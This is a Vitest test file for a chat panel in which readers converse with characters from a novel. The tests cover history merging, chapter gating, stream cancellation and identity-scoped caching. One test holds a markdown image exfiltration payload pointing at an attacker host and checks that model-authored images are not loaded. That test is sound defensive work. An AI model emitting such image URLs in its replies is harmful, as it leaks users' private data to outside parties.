import { render, screen, waitFor } from '@testing-library/react';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import {
  chatSessionKey,
  useChatStore,
} from '@/features/character-chat';
import type { Character, ChatMessage } from '@/shared/types';
import { ChatMarkdown, ChatPanel, mergeVisibleChatMessages } from './ChatPanel';

const mocks = vi.hoisted(() => ({
  history: {
    data: [] as ChatMessage[],
    isLoading: false,
    isError: false,
    refetch: vi.fn(),
  },
  historyByScope: {} as Record<string, ChatMessage[]>,
  historyEnabled: false,
  historyScope: '',
}));

vi.mock('@/features/character-chat', async () => {
  const actual = await vi.importActual<typeof import('@/features/character-chat')>(
    '@/features/character-chat',
  );
  return {
    ...actual,
    useChatHistory: (
      _characterId: string,
      _chapter: number,
      identityScope: string,
      enabled: boolean,
    ) => {
      mocks.historyEnabled = enabled;
      mocks.historyScope = identityScope;
      return {
        ...mocks.history,
        data: mocks.historyByScope[identityScope] ?? mocks.history.data,
      };
    },
  };
});

const character = {
  id: 'character',
  novel_id: 'novel',
  name: '陈翔',
  aliases: [],
  role: 'protagonist',
  avatar_status: 'pending',
} satisfies Character;

describe('ChatMarkdown', () => {
  it('does not load model-authored image URLs', () => {
    const { container } = render(
      <ChatMarkdown>{'![private memory](https://attacker.invalid/leak?secret=value)'}</ChatMarkdown>,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText('private memory')).not.toBeNull();
  });
});

describe('ChatPanel history', () => {
  const selfSession = chatSessionKey(character.id, 'self');

  beforeEach(() => {
    mocks.history.data = [];
    mocks.history.isLoading = false;
    mocks.history.isError = false;
    mocks.history.refetch.mockReset();
    mocks.historyByScope = {};
    mocks.historyEnabled = false;
    mocks.historyScope = '';
    useChatStore.getState().reset();
  });

  it('deduplicates committed turns and hides messages beyond the current chapter', () => {
    const base = {
      character_id: 'character',
      created_at: '2026-08-23T00:00:00Z',
    };
    const history: ChatMessage[] = [{
      ...base, id: 'server-user', turn_id: 'turn-1', role: 'user', content: '你好', chapter_context: 1,
    }];
    const session: ChatMessage[] = [
      { ...base, id: 'local-user', turn_id: 'turn-1', role: 'user', content: '重复', chapter_context: 1 },
      { ...base, id: 'future', turn_id: 'turn-2', role: 'character', content: '未来', chapter_context: 2 },
    ];

    expect(mergeVisibleChatMessages(history, session, 1).map(message => message.content))
      .toEqual(['你好']);
  });

  it('blocks sending until failed history can be retried', () => {
    mocks.history.isError = true;

    render(
      <ChatPanel
        character={character}
        novelId="novel"
        currentChapter={1}
        readerIdentityScope="self"
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(screen.getByRole('alert').textContent).toContain('对话记录加载失败');
    expect(screen.getByRole('button', { name: '重试加载' })).toBeTruthy();
    expect(screen.getByRole('textbox').hasAttribute('disabled')).toBe(true);
    expect(screen.getByRole('button', { name: '发送消息' }).hasAttribute('disabled')).toBe(true);
  });

  it('blocks a replacement message while the failed turn keeps its retry key', () => {
    useChatStore.setState({
      activeTurnId: { [selfSession]: undefined },
      failedTurn: {
        [selfSession]: {
          turnId: 'failed-turn',
          sessionKey: selfSession,
          characterId: character.id,
          payload: {
            novel_id: 'novel',
            message: 'first',
            current_chapter: 1,
          },
          error: { code: 'stream_error', message: '生成失败，请重试' },
        },
      },
    });

    render(
      <ChatPanel
        character={character}
        novelId="novel"
        currentChapter={1}
        readerIdentityScope="self"
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(screen.getByRole('alert').textContent).toContain('生成失败，请重试');
    expect(screen.getByRole('button', { name: '重试' })).toBeTruthy();
    expect(screen.getByRole('textbox').hasAttribute('disabled')).toBe(true);
    expect(screen.getByRole('button', { name: '发送消息' }).hasAttribute('disabled')).toBe(true);
  });

  it('waits for committed reading progress before loading history', () => {
    render(
      <ChatPanel
        character={character}
        novelId="novel"
        currentChapter={2}
        readerIdentityScope="self"
        canChat={false}
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(mocks.historyEnabled).toBe(false);
  });

  it('uses generic role and avatar fallbacks for a progress-redacted character', () => {
    const { container } = render(
      <ChatPanel
        character={{ id: 'partial', novel_id: 'novel', name: 'Partial' }}
        novelId="novel"
        currentChapter={1}
        readerIdentityScope="self"
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(screen.getByText('角色')).toBeTruthy();
    expect(screen.queryByText('主角')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
  });

  it('does not render cached messages for a character from another novel', () => {
    const oldMessage: ChatMessage = {
      id: 'old-message',
      role: 'character',
      content: '上一部小说的私密对话',
      character_id: 'character',
      chapter_context: 1,
      created_at: '2026-08-23T00:00:00Z',
    };
    mocks.history.data = [oldMessage];
    useChatStore.setState({ messages: { [selfSession]: [oldMessage] } });

    const { container } = render(
      <ChatPanel
        character={character}
        novelId="new-novel"
        currentChapter={1}
        readerIdentityScope="self"
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(mocks.historyEnabled).toBe(false);
    expect(screen.queryByText('上一部小说的私密对话')).toBeNull();
    expect(container.innerHTML).toBe('');
  });

  it('cancels and hides a stream created in another chapter', async () => {
    const cancel = vi.fn();
    useChatStore.setState({
      streamingText: { [selfSession]: '第二章的未来内容' },
      isStreaming: { [selfSession]: true },
      cancelStream: { [selfSession]: cancel },
      activeTurnId: { [selfSession]: 'turn-2' },
      activeTurn: {
        [selfSession]: {
          turnId: 'turn-2',
          sessionKey: selfSession,
          characterId: 'character',
          payload: {
            novel_id: 'novel',
            message: '继续',
            current_chapter: 2,
          },
        },
      },
    });

    render(
      <ChatPanel
        character={character}
        novelId="novel"
        currentChapter={1}
        readerIdentityScope="self"
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(screen.queryByText('第二章的未来内容')).toBeNull();
    expect(screen.getByRole('textbox').hasAttribute('disabled')).toBe(true);
    expect(screen.getByRole('button', { name: '发送消息' }).hasAttribute('disabled')).toBe(true);
    await waitFor(() => expect(cancel).toHaveBeenCalledOnce());
    expect(screen.getByRole('alert').textContent).toContain('第 2 章有一条未完成消息');
    expect(useChatStore.getState().failedTurn[selfSession]?.turnId).toBe('turn-2');
  });

  it('keeps stream deltas and optimistic messages out of the saved live log', () => {
    useChatStore.setState({
      messages: { [selfSession]: [{
        id: 'pending-user', turn_id: 'pending-turn', role: 'user', content: '未提交的问题',
        character_id: character.id, chapter_context: 1, created_at: '2026-09-05T00:00:00Z',
      }] },
      streamingText: { [selfSession]: '未提交的流式回复' },
      isStreaming: { [selfSession]: true },
      activeTurn: { [selfSession]: {
        turnId: 'pending-turn', sessionKey: selfSession, characterId: character.id,
        payload: { novel_id: 'novel', message: '未提交的问题', current_chapter: 1 },
      } },
    });
    render(<ChatPanel character={character} novelId="novel" currentChapter={1}
      readerIdentityScope="self" canChat isOpen onClose={() => undefined} />);
    expect(screen.getByText('未提交的问题')).toBeTruthy();
    expect(screen.getByText('未提交的流式回复')).toBeTruthy();
    expect(screen.getByRole('log', { name: '已保存的对话' }).textContent).toBe('');
    expect(screen.getByRole('status', { name: '对话状态' }).textContent).toContain('尚未确认保存');
  });

  it('cancels and hides a stream from another novel at the same chapter', async () => {
    const cancel = vi.fn();
    useChatStore.setState({
      streamingText: { [selfSession]: '另一部小说的内容' },
      isStreaming: { [selfSession]: true },
      cancelStream: { [selfSession]: cancel },
      activeTurnId: { [selfSession]: 'turn-old-novel' },
      activeTurn: {
        [selfSession]: {
          turnId: 'turn-old-novel',
          sessionKey: selfSession,
          characterId: 'character',
          payload: {
            novel_id: 'old-novel',
            message: '继续',
            current_chapter: 1,
          },
        },
      },
    });

    render(
      <ChatPanel
        character={{ ...character, novel_id: 'new-novel' }}
        novelId="new-novel"
        currentChapter={1}
        readerIdentityScope="self"
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(screen.queryByText('另一部小说的内容')).toBeNull();
    await waitFor(() => expect(cancel).toHaveBeenCalledOnce());
    expect(screen.queryByRole('button', { name: '重试' })).toBeNull();
  });

  it('hides cached messages in the same render when reader identity changes', () => {
    const base = {
      role: 'user' as const,
      character_id: character.id,
      chapter_context: 1,
      created_at: '2026-08-23T00:00:00Z',
    };
    const selfMessage = { ...base, id: 'self', content: 'self-only marker' };
    const characterAMessage = { ...base, id: 'a', content: 'character-a marker' };
    const characterASession = chatSessionKey(character.id, 'character:a');

    mocks.historyByScope.self = [selfMessage];
    useChatStore.setState({
      messages: {
        [selfSession]: [selfMessage],
        [characterASession]: [characterAMessage],
      },
    });

    const { rerender } = render(
      <ChatPanel
        character={character}
        novelId="novel"
        currentChapter={1}
        readerIdentityScope="self"
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(screen.getByText('self-only marker')).toBeTruthy();

    rerender(
      <ChatPanel
        character={character}
        novelId="novel"
        currentChapter={1}
        readerIdentity="角色甲"
        readerIdentityScope="character:a"
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );

    expect(mocks.historyScope).toBe('character:a');
    expect(screen.queryByText('self-only marker')).toBeNull();
    expect(screen.getByText('character-a marker')).toBeTruthy();

    rerender(
      <ChatPanel
        character={character}
        novelId="novel"
        currentChapter={1}
        readerIdentity="角色甲（新显示名）"
        readerIdentityScope="character:a"
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );
    expect(screen.getByText('character-a marker')).toBeTruthy();

    rerender(
      <ChatPanel
        character={character}
        novelId="novel"
        currentChapter={1}
        readerIdentity="角色乙"
        readerIdentityScope="character:b"
        canChat
        isOpen
        onClose={() => undefined}
      />,
    );
    expect(mocks.historyScope).toBe('character:b');
    expect(screen.queryByText('character-a marker')).toBeNull();
  });
});
